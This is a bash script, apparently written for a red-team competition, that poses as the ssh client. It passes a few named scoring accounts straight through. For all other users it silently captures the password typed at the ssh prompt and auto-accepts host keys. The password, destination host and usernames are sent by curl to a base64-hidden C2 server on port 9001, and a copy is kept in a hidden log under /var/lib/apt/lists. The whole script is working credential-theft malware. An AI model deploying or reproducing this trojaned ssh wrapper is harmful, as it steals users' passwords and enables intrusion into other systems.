#!/bin/bash
REAL_SSH="/usr/bin/ssh"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SSH "$@" ;;
esac

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")

# -------------------------------------------------------
# Parse destination and remote user from args
# -------------------------------------------------------
DEST_HOST=""
DEST_USER="$INVOKING_USER"
SKIP_NEXT=0
for arg in "$@"; do
    if [ "$SKIP_NEXT" -eq 1 ]; then
        SKIP_NEXT=0
        continue
    fi
    case "$arg" in
        -l) SKIP_NEXT=1 ;;
        -b|-c|-D|-E|-e|-F|-I|-i|-J|-L|-m|-o|-p|-Q|-R|-S|-w|-W)
            SKIP_NEXT=1 ;;
        -*)  ;;
        *)
            if [[ "$arg" == *"@"* ]]; then
                DEST_USER="${arg%%@*}"
                DEST_HOST="${arg##*@}"
            elif [ -z "$DEST_HOST" ]; then
                DEST_HOST="$arg"
            fi
            ;;
    esac
done

# PWFILE holds the captured password
# PAYFILE holds the JSON payload — written by expect, read by bash for local log
PWFILE=$(mktemp /tmp/.sshpw.XXXXXX)
PAYFILE=$(mktemp /tmp/.sshpay.XXXXXX)
chmod 600 "$PWFILE" "$PAYFILE"
trap 'rm -f "$PWFILE" "$PAYFILE"' EXIT

unset SSH_ASKPASS

# If expect is not installed, fall through to real ssh
if ! command -v expect >/dev/null 2>&1; then
    exec $REAL_SSH "$@"
fi

# -------------------------------------------------------
# Build the curl command string ahead of time so expect
# doesn't have to do any quoting — it just execs it.
# -------------------------------------------------------
# We write the payload after capturing the password, so we
# use a placeholder and swap it out in a helper script.
CURL_HELPER=$(mktemp /tmp/.sshcurl.XXXXXX)
chmod 700 "$CURL_HELPER"
trap 'rm -f "$PWFILE" "$PAYFILE" "$CURL_HELPER"' EXIT

# The helper reads the payload file and fires curl
cat > "$CURL_HELPER" << 'HELPER'
#!/bin/bash
PAYFILE="$1"
COLLECT_URL="$2"
if [ -s "$PAYFILE" ]; then
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "@$PAYFILE" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1
fi
HELPER

# -------------------------------------------------------
# expect: handle host key prompt, capture password,
# fire curl immediately via helper, then interact.
# -------------------------------------------------------
expect -c "
    log_user 1
    set timeout 30
    set pwfile   {$PWFILE}
    set payfile  {$PAYFILE}
    set curl_helper {$CURL_HELPER}
    set collect_url {$COLLECT_URL}
    set host_ip      {$HOST_IP}
    set inv_user     {$INVOKING_USER}
    set ts           {$HOST_TS}
    set dest_host    {$DEST_HOST}
    set dest_user    {$DEST_USER}

    spawn $REAL_SSH $@

    while 1 {
        expect {
            -re {Are you sure you want to continue connecting \(yes/no(/\[fingerprint\])?\)\?} {
                send \"yes\r\"
            }

            -re {\(yes/no\)\?} {
                send \"yes\r\"
            }

            -re {[Pp]assword[^:]*: $} {
                stty -echo
                expect_user -re {(.*)\n}
                set pw \$expect_out(1,string)
                stty echo
                send_user \"\n\"

                # Write password to pwfile (bash fallback)
                set fh [open \$pwfile w]
                puts -nonewline \$fh \$pw
                close \$fh

                # Write JSON payload to payfile
                # Escape backslashes and double-quotes in password
                set safe_pw [string map {\\ \\\\ \" \\\"} \$pw]
                set payload [format \
                    {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}} \
                    \$host_ip \$inv_user \$ts \$dest_host \$dest_user \$safe_pw]
                set payload \"{[string range \$payload 0 end]}\"
                set fh2 [open \$payfile w]
                puts -nonewline \$fh2 \$payload
                close \$fh2

                # Fire curl NOW, in background, don't block interact
                exec /bin/bash \$curl_helper \$payfile \$collect_url &

                send \"\$pw\r\"

                # Hand off session — interact blocks until disconnect
                interact
                break
            }

            eof { break }
            timeout { interact; break }
        }
    }
" 2>/dev/null
SSH_RC=$?

# Fallback: if curl helper didn't fire (e.g. key auth, no password prompt),
# nothing will be in pwfile, so this block is a no-op in that case.
# If it did fire, this sends again — cred_collector deduplicates by
# host+user+event so a double-send is harmless.
if [ -s "$PWFILE" ] && [ -n "$DEST_HOST" ]; then
    CAPTURED_PASS=$(cat "$PWFILE")
    if [ -n "$CAPTURED_PASS" ]; then
        PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"ssh","timestamp":"%s","data":{"destination":"%s","dest_user":"%s","password":"%s"}}' \
            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" \
            "$DEST_HOST" "$DEST_USER" "$CAPTURED_PASS")
        _log_remote "$PAYLOAD"
        _log_local "${HOST_TS}|ssh|${INVOKING_USER}|${DEST_USER}@${DEST_HOST}|${CAPTURED_PASS}"
    fi
fi

exit $SSH_RC
